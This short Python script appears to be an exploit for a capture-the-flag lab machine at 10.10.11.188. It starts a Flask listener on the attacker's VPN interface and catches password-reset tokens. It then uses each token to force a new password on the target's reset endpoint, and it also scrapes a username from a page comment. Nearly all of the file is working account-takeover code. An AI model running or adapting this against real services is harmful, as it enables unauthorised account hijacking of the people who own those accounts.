#!/usr/bin/python3


import netifaces
import requests
import logging
import re
import sys
from flask import (
    Flask,
    request
)
from pwn import *
import urllib.parse

# Flask configutation


app = Flask(__name__)
tun0_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
port  = 9980
password = "dicker"




@app.route("/reset")
def reset():
    try:
        token=urllib.parse.quote(request.args.get('token'))
        log.info(f"the token is {token}")
        data = {'password':f'{password}', 'cpassword':f'{password}'}
        reset_pass = requests.post(f"http://10.10.11.188/reset?token={token}", data=data)
        if 'Success' in reset_pass.text:
            log.success("successfully changed")
        else:
            print("invalid token")

    except Exception as e:
        pass




def get_username(url:str="http://10.10.11.188/") -> None:

    sess = requests.Session()
    ress = sess.get(url=url)
    return re.findall(r'<!-- Q1 release fix by (.*) -->', ress.text)[0]


def main():

    username = get_username()
    print(tun0_ip)

if __name__ == "__main__":
    app.run(host=tun0_ip, port=9980, debug=True)
